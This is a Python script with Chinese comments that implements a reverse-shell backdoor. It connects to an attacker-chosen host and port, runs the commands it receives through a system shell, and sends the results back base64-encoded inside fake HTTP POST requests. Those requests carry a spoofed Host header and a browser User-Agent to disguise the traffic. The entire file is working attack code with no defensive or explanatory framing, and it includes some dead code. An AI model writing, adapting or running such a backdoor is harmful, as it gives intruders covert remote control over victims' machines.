# -*- coding: utf-8 -*-
import base64
import argparse
import socket
import subprocess
import sys
import time

def connection(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,int(port)))
    while True:
        data = s.recv(4096)
        try:
            data = decryption_req(data).decode()
            comRst = subprocess.Popen(data,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            m_stdout, m_stderr = comRst.communicate()
            rst = m_stdout.decode(sys.getfilesystemencoding()).encode()
            s.send(encryption_req(rst))
        except Exception as e:
            s.send(encryption_req(str(e).encode()))

        time.sleep(1)
    s.close()

# 加密
def encryption_req(data):
    # 可以采用任何加密或编码方式
    data = base64.b64encode(data).decode()

    sendData = "POST /pushdata"
    sendData += "\r\n"
    sendData += "HTTP/1.1"
    sendData += "\r\n"
    sendData += "Host: tazxuo.com"
    sendData += "\r\n"
    sendData += "Connection: close"
    sendData += "\r\n"
    sendData += "Upgrade-Insecure-Requests: 1"
    sendData += "\r\n"
    sendData += "User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/32.13 (KHTML, like Gecko) Chrome/59.0.332.13 Safari/452.36"
    sendData += "\r\n"
    sendData += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
    sendData += "\r\n"
    sendData += "Accept-Language: en-US,en;q=0.9"
    sendData += "\r\n"
    sendData += "Accept-Encoding: gzip, deflate"
    sendData += "\r\n"
    sendData += "\r\n"
    sendData += "stri0date=%s" % data
    sendData += "\r\n"
    sendData += "\r\n"
    return sendData.encode()

# 解密
def decryption_req(data):
    data = data.decode()
    data = data[data.find("Connection: keep-alive\r\n\r\n") + 26:]
    data = str(base64.b64decode(data), "utf-8")
    return data.encode()

    # 解码/解密
    result = str(base64.b64decode(result), "utf-8")

if __name__ == '__main__':
    # 命令行参数解析对象
    parser = argparse.ArgumentParser()
    parser.add_argument('-host',dest='hostName',help='Host Name')
    parser.add_argument('-port',dest='conPort',help='Host Port')
    # 解析命令行参数
    args = parser.parse_args()
    host = args.hostName
    port = args.conPort

    if host == None or port == None:
        print(parser.parse_args(['-h']))
        exit(0)

    connection(host, port)